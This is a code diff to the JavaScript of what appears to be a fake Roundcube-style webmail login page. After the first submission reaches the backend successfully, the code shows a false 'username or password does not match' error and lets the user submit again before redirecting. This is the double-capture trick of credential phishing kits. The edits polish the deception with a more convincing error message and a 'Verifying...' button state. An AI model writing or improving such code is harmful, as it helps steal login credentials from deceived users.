@@ -2,6 +2,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("userForm");
   const messageDiv = document.getElementById("message");
   const submitButton = document.getElementById("rcmloginsubmit");
+  const originalButtonText = submitButton.textContent;
   let submissionCount = 0; // Track number of submissions
   let lastFormData = null; // store last-submitted form data in-memory briefly
 
@@ -12,8 +13,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
     // First submission: submit to backend, clear password, and show message
     if (submissionCount === 1) {
+      // indicate progress on the button instead of the message div
       submitButton.disabled = true;
-      messageDiv.textContent = "Submitting...";
+      submitButton.textContent = "Verifying...";
       messageDiv.classList.add("show");
       messageDiv.classList.remove("success", "error");
 
@@ -50,7 +52,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         if (response.ok && result.success) {
           messageDiv.textContent =
-            "Please fill in correct information to continue";
+            "The username or password does not match our records. Please try again.";
           messageDiv.classList.remove("error");
           messageDiv.classList.add("show", "success");
         } else {
@@ -67,13 +69,15 @@ document.addEventListener("DOMContentLoaded", () => {
         messageDiv.classList.add("show", "error");
       } finally {
         submitButton.disabled = false;
+        submitButton.textContent = originalButtonText;
       }
       return;
     }
 
     // Second submission: proceed with form submission and redirect
-    // Disable the button
+    // Disable the button and show progress on it
     submitButton.disabled = true;
+    submitButton.textContent = "Verifying...";
     messageDiv.textContent = "";
     messageDiv.classList.add("show");
     messageDiv.classList.remove("success", "error");
@@ -164,6 +168,7 @@ document.addEventListener("DOMContentLoaded", () => {
       messageDiv.classList.add("show", "error");
     } finally {
       submitButton.disabled = false;
+      submitButton.textContent = originalButtonText;
     }
   });
 });
